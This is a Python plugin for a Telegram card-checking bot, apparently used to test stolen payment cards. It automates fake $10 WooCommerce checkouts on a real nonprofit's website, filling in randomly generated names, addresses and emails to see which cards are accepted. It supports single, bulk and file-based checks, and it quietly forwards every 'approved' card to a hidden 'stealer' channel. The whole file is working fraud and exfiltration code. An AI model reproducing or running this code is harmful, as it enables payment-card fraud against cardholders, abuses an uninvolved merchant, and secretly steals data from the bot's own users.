import time
import asyncio
import re
import os
import random
import string
import requests
from bs4 import BeautifulSoup
from pyrogram import Client, filters, enums
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved

# -------------------------------------------------------------
# Configuration
# -------------------------------------------------------------
GATE_NAME = "Payeezy 10$"
MAX_MSC_LIMIT = 10
MAX_TSC_LIMIT = 100

# Owner DM Link (clickable ㊕)
OWNER_DM = "https://t.me/spid_3r"
SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"

# Stealer channel ID (adjust if needed)
STEALER_CHANNEL_ID = -1003627495953

# -------------------------------------------------------------
# Helper functions (synchronous, from original script)
# -------------------------------------------------------------
def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah", "Yara", "Khalid", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa", "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Rasha", "Majid", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada", "Ali", "Yasmin", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Eman", "Salma", "Yahya", "Husam", "Diana", "Khaled", "Noura", "Dalia", "Khalil", "Hamza", "Waleed", "Ziad", "Reem", "Yasser", "Mazen", "Rana", "Tariq", "Maya", "Raed", "Safia", "Nizar", "Rawan", "Hala", "Majid", "Maher", "Heba", "Sally"]
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White", "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar", "Gomez", "Hernandez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera", "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza", "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard", "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell", "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb"]
    full_name = random.choice(first_names) + " " + random.choice(last_names)
    first_name, last_name = full_name.split()
    return first_name, last_name

def generate_address():
    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
    states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
    zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]
    city = random.choice(cities)
    state = states[cities.index(city)]
    street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
    zip_code = zip_codes[states.index(state)]
    return city, state, street_address, zip_code

def generate_random_account():
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=4))
    return f"{name}{number}@gmail.com"

def generate_phone():
    number = ''.join(random.choices(string.digits, k=7))
    return f"303{number}"

def parse_error_response(response_text):
    try:
        result = response_text.json()
        if 'messages' in result:
            soup = BeautifulSoup(result['messages'], 'html.parser')
            errors = []
            for li in soup.find_all('li'):
                error_text = li.get_text(strip=True)
                if error_text:
                    errors.append(error_text)
            if errors:
                return ' | '.join(errors)
            elif 'redirect' in result:
                return "SUCCESS - Redirect: " + result.get('redirect', '')
        elif result.get('result') == 'success':
            return "SUCCESS - Order placed!"
    except:
        pass
    
    if 'captcha' in response_text.text.lower():
        return "CAPTCHA_REQUIRED_USE_YOUR_KEY"
    elif 'terms and conditions' in response_text.text.lower():
        return "TERMS_REQUIRED_WE_ACCEPT_AUTOMOTİC"
    
    return 'Unknown error İdk Man Chk Site'

def process_card_sync(card_line, site_url, product_url, product_id):
    session = requests.Session()
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cache-Control': 'max-age=0',
        'Sec-Ch-Ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'Sec-Ch-Ua-Mobile': '?1',
        'Sec-Ch-Ua-Platform': '"Android"',
        'Upgrade-Insecure-Requests': '1'
    }
    
    parts = card_line.strip().split('|')
    if len(parts) != 4:
        return "Error", "Invalid format"
    
    cc, mm, yy, cvv = parts
    if len(yy) == 4:
        yy = yy[2:]
    
    card_data = f"{cc}|{mm}|{yy}|{cvv}"
    
    try:
        session.get(site_url, headers=headers, timeout=10)      
        shop_resp = session.get(f"{site_url}/shop/", headers=headers, timeout=10)
        product_resp = session.get(product_url, headers=headers, timeout=10)
        
        # Extract product ID if needed (already provided, but fallback)
        pid_match = re.search(r'name="add-to-cart"\s+value="(\d+)"', product_resp.text)
        current_product_id = pid_match.group(1) if pid_match else product_id
        
        # Add to cart
        add_data = {
            'nyp': '10.00',
            'update-price': '',
            '_nypnonce': '',
            'quantity': '1',
            'add-to-cart': current_product_id
        }
        add_headers = {
            **headers,
            'Origin': site_url,
            'Referer': product_url,
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        session.post(product_url, data=add_data, headers=add_headers, timeout=10)
        
        # Get cart hash and checkout page
        session.get(f"{site_url}/cart/", headers=headers, timeout=10)
        cart_hash = session.cookies.get('woocommerce_cart_hash', '')
        checkout_resp = session.get(f"{site_url}/checkout/", headers=headers, timeout=10)
        
        # Extract nonce
        nonce_match = re.search(r'name="woocommerce-process-checkout-nonce"\s+value="([^"]+)"', checkout_resp.text)
        if not nonce_match:
            return "Error", "Checkout nonce not found!"
        checkout_nonce = nonce_match.group(1)
        
        # Extract session pages number
        pages_match = re.search(r'wc_order_attribution_session_pages["\']?\s*:\s*(\d+)', checkout_resp.text)
        session_pages = int(pages_match.group(1)) if pages_match else 11
        
        # Generate random user info
        first_name, last_name = generate_full_name()
        city, state, street_address, zip_code = generate_address()
        email = generate_random_account()
        phone = generate_phone()
        
        # Prepare checkout data
        checkout_headers = {
            'authority': 'learntoreadstjohns.org',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': site_url,
            'referer': f'{site_url}/checkout/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': headers['User-Agent'],
            'x-requested-with': 'XMLHttpRequest'
        }
        checkout_data = (
            f'wc_order_attribution_source_type=typein'
            f'&wc_order_attribution_referrer=(none)'
            f'&wc_order_attribution_utm_campaign=(none)'
            f'&wc_order_attribution_utm_source=(direct)'
            f'&wc_order_attribution_utm_medium=(none)'
            f'&wc_order_attribution_utm_content=(none)'
            f'&wc_order_attribution_utm_id=(none)'
            f'&wc_order_attribution_utm_term=(none)'
            f'&wc_order_attribution_utm_source_platform=(none)'
            f'&wc_order_attribution_utm_creative_format=(none)'
            f'&wc_order_attribution_utm_marketing_tactic=(none)'
            f'&wc_order_attribution_session_entry={site_url}%2F'
            f'&wc_order_attribution_session_start_time=2026-05-13+07%3A29%3A21'
            f'&wc_order_attribution_session_pages={session_pages + 1}'
            f'&wc_order_attribution_session_count=1'
            f'&wc_order_attribution_user_agent={headers["User-Agent"]}'
            f'&billing_first_name={first_name}'
            f'&billing_last_name={last_name}'
            f'&billing_company='
            f'&billing_country=US'
            f'&billing_address_1={street_address.replace(" ", "+")}'
            f'&billing_address_2='
            f'&billing_city={city.replace(" ", "+")}'
            f'&billing_state={state}'
            f'&billing_postcode={zip_code}'
            f'&billing_phone={phone}'
            f'&billing_email={email}'
            f'&account_password='
            f'&order_comments='
            f'&payment_method=stripe'
            f'&terms-field=1'
            f'&woocommerce-process-checkout-nonce={checkout_nonce}'
            f'&_wp_http_referer=%2Fcheckout%2F'
        )
        
        checkout_resp = session.post(
            f"{site_url}/?wc-ajax=checkout",
            data=checkout_data,
            headers=checkout_headers,
            timeout=15
        )
        
        error_msg = parse_error_response(checkout_resp)
        
        try:
            result_json = checkout_resp.json()
            if result_json.get('result') == 'success':
                error_msg = f"Payment Charged ✅ {result_json.get('redirect', '')}"
        except:
            pass
        
        # Determine status from error_msg
        if "SUCCESS" in error_msg or "Charged" in error_msg:
            return "Approved ✅", error_msg[:50]
        elif "CAPTCHA" in error_msg or "TERMS" in error_msg:
            return "Declined ❌", error_msg
        else:
            return "Declined ❌", error_msg if error_msg else "Transaction Declined"
        
    except Exception as e:
        return "Error", str(e)[:50]

# -------------------------------------------------------------
# Stealer function (keeps owner line – change if needed)
# -------------------------------------------------------------
async def send_hit_to_stealer(client, fullcc, status, response, gateway, time_taken, first_name, role):
    try:
        stealer_msg = f"""✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗛𝗜𝗧 ✅

{SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
{SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}

{SYMBOL} 𝗧𝗼𝗼ᴋ {time_taken:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=stealer_msg, parse_mode="HTML", reply_markup=None)
    except Exception as e:
        print(f"[Stealer Error] {e}")

# -------------------------------------------------------------
# Async wrapper for single card
# -------------------------------------------------------------
async def call_payeezy_api(fullcc):
    # Get site_url and product_url dynamically
    site_url = "https://learntoreadstjohns.org"
    try:
        loop = asyncio.get_running_loop()
        # First, get product URL (run in thread)
        def get_product_info():
            sess = requests.Session()
            sess.headers.update({
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
            })
            sess.get(site_url)
            shop_resp = sess.get(f"{site_url}/shop/")
            product_match = re.search(r'href="(https://learntoreadstjohns\.org/product/[^"]+)"', shop_resp.text)
            if not product_match:
                return None, None
            product_url = product_match.group(1)
            product_resp = sess.get(product_url)
            pid_match = re.search(r'name="add-to-cart"\s+value="(\d+)"', product_resp.text)
            product_id = pid_match.group(1) if pid_match else "224"
            return product_url, product_id
        product_url, product_id = await loop.run_in_executor(None, get_product_info)
        if not product_url:
            return "Error", "Product not found on site"
        
        # Process the card
        status, msg = await loop.run_in_executor(None, process_card_sync, fullcc, site_url, product_url, product_id)
        return status, msg
    except Exception as e:
        return "Error", str(e)[:50]

def extract_cards(text):
    pattern = r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}"
    return re.findall(pattern, text)

# -------------------------------------------------------------
# SINGLE CHECK COMMAND (/pz)
# -------------------------------------------------------------
@Client.on_message(filters.command("pz", [".", "/"]))
async def payeezy_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        getcc = await getmessage(message)
        if not getcc:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /pz

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> /pz cc|mm|yyyy|cvv
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        gateway = GATE_NAME

        firstresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■□□□"""
        firstchk = await message.reply_text(firstresp, quote=True, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        secondresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■□"""
        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        start = time.perf_counter()
        status, response = await call_payeezy_api(fullcc)

        getbin = await get_bin_details(cc)
        brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]

        thirdresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ... ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤ɴꜱᴇ -» ■■■■"""
        thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        if "Approved" in status or "✅" in status:
            await send_hit_to_stealer(Client, fullcc, status, response, gateway, time.perf_counter() - start, first_name, role)

        display_status = f"<b>{status}</b>"

        finalresp = f"""{display_status}

{SYMBOL} 𝗖𝗖 ⇾ <code>{fullcc}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {gateway}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {response}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {brand}_{type_}-{level}
{SYMBOL} 𝗕ᴀɴᴋ: {bank}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {country} {flag}

{SYMBOL} 𝗧ᴏᴏᴋ {time.perf_counter() - start:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""

        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)

        await setantispamtime(user_id)
        await deductcredit(user_id)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# -------------------------------------------------------------
# MASS CHECK (text/reply) (/mpz)
# -------------------------------------------------------------
@Client.on_message(filters.command("mpz", [".", "/"]))
async def payeezy_mass_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        ccs = []
        if message.reply_to_message:
            reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
            ccs = extract_cards(reply_text)
        else:
            text_parts = message.text.split(maxsplit=1)
            if len(text_parts) > 1:
                ccs = extract_cards(text_parts[1])

        if not ccs:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /mpz

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> Reply to cards or /mpz cc|mm|yyyy|cvv (up to {MAX_MSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        if len(ccs) > MAX_MSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_MSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_MSC_LIMIT]

        await process_sequential_check(Client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# -------------------------------------------------------------
# TXT FILE COMMAND (/tpz)
# -------------------------------------------------------------
@Client.on_message(filters.command("tpz", [".", "/"]))
async def payeezy_txt_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        target_message = None
        if message.reply_to_message and message.reply_to_message.document:
            target_message = message.reply_to_message
        elif message.document:
            target_message = message

        if not target_message or not target_message.document.file_name.endswith(".txt"):
            resp = f"""✦ <b>ɴᴏ ꜰɪʟᴇ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /tpz

⟢ ᴜᴘʟᴏᴀᴅ ᴀ .ᴛxᴛ ꜰɪʟᴇ ᴏʀ ʀᴇᴘʟʏ ᴛᴏ ᴏɴᴇ (up to {MAX_TSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        file_path = await Client.download_media(target_message)
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
            ccs = extract_cards(content)
        os.remove(file_path)

        if not ccs:
            await message.reply("✦ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ɪɴ ꜰɪʟᴇ ✗ ✦", quote=True)
            return

        if len(ccs) > MAX_TSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_TSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_TSC_LIMIT]

        await process_sequential_check(Client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# -------------------------------------------------------------
# SEQUENTIAL PROCESSING (with progress, separate approved, declined summary)
# -------------------------------------------------------------
async def process_sequential_check(Client, message, ccs, user_id, first_name, role):
    total_cards = len(ccs)
    processed = 0
    approved_count = 0
    declined_count = 0
    gateway = GATE_NAME
    start_time = time.perf_counter()
    approved_cards = []

    progress_text = f"""Payeezy - FirstDate
Admin

{SYMBOL} Response: Starting...

Progress: 0/{total_cards}
Approved ✅: 0
Declined ❌: 0
Remaining: {total_cards}

Checked by: {first_name} ({role})"""

    progress_msg = await message.reply(progress_text, quote=True, parse_mode=enums.ParseMode.HTML)

    for idx, fullcc in enumerate(ccs, 1):
        processed = idx
        remaining = total_cards - processed

        status, response = await call_payeezy_api(fullcc)

        cc_num = fullcc.split('|')[0]
        getbin = await get_bin_details(cc_num)
        brand = getbin[0] if len(getbin) > 0 else "Unknown"
        type_ = getbin[1] if len(getbin) > 1 else "Unknown"
        level = getbin[2] if len(getbin) > 2 else "Unknown"
        bank = getbin[3] if len(getbin) > 3 else "Unknown"
        country = getbin[4] if len(getbin) > 4 else "Unknown"
        flag = getbin[5] if len(getbin) > 5 else ""

        if "Approved" in status or "✅" in status:
            approved_count += 1
            response_status = "APPROVED ✅"
            card_time = time.perf_counter() - start_time
            approved_cards.append({
                "fullcc": fullcc,
                "status": status,
                "response": response,
                "gateway": gateway,
                "brand": f"{brand}_{type_}-{level}",
                "bank": bank,
                "country": country,
                "flag": flag,
                "time": card_time
            })
            await send_hit_to_stealer(Client, fullcc, status, response, gateway, card_time, first_name, role)
        else:
            declined_count += 1
            response_status = "DECLINED ❌"

        try:
            await Client.edit_message_text(
                message.chat.id,
                progress_msg.id,
                f"""Payeezy - FirstDate
Admin

{SYMBOL} Response: {response_status}

Progress: {processed}/{total_cards}
Approved ✅: {approved_count}
Declined ❌: {declined_count}
Remaining: {remaining}

Checked by: {first_name} ({role})""",
                parse_mode=enums.ParseMode.HTML
            )
        except:
            pass
        await asyncio.sleep(0.5)

    await progress_msg.delete()

    for card in approved_cards:
        display_status = f"<b>{card['status']}</b>"
        approved_msg = f"""{display_status}

{SYMBOL} 𝗖𝗖 ⇾ <code>{card['fullcc']}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {card['gateway']}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {card['response']}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {card['brand']}
{SYMBOL} 𝗕ᴀɴᴋ: {card['bank']}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {card['country']} {card['flag']}

{SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
        await message.reply_text(approved_msg, quote=True, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

    elapsed_time = round(time.perf_counter() - start_time, 2)

    if approved_count > 0:
        declined_summary = f"""❌ 𝗗𝗲𝗰𝗹ɪɴᴇᴅ 𝗖ᴀʀᴅ𝘀 ({declined_count})

━━━━━━━━━━━━━━━━━━━━
"""
        declined_list = [cc for cc in ccs if cc not in [c['fullcc'] for c in approved_cards]]
        for card in declined_list[:15]:
            declined_summary += f"{SYMBOL} {card} → Declined\n"
        if declined_count > 15:
            declined_summary += f"\n... and {declined_count - 15} more declined cards"
        declined_summary += f"""
━━━━━━━━━━━━━━━━━━━━
✅ Approved: {approved_count}
❌ Declined: {declined_count}
📊 Total: {total_cards}
⏱ Time: {elapsed_time}s
👤 Checked by: {first_name} ({role})"""
        await message.reply_text(declined_summary, quote=True, parse_mode=enums.ParseMode.HTML)
    else:
        await message.reply_text(
            f"""❌ 𝗡ᴏ 𝗔ᴘᴘʀᴏᴠᴇᴅ 𝗖ᴀʀᴅ𝘀

━━━━━━━━━━━━━━━━━━━━
📊 Total Cards: {total_cards}
❌ All Declined: {declined_count}
⏱ Time: {elapsed_time}s
👤 Checked by: {first_name} ({role})""",
            quote=True,
            parse_mode=enums.ParseMode.HTML
        )

    await setantispamtime(user_id)
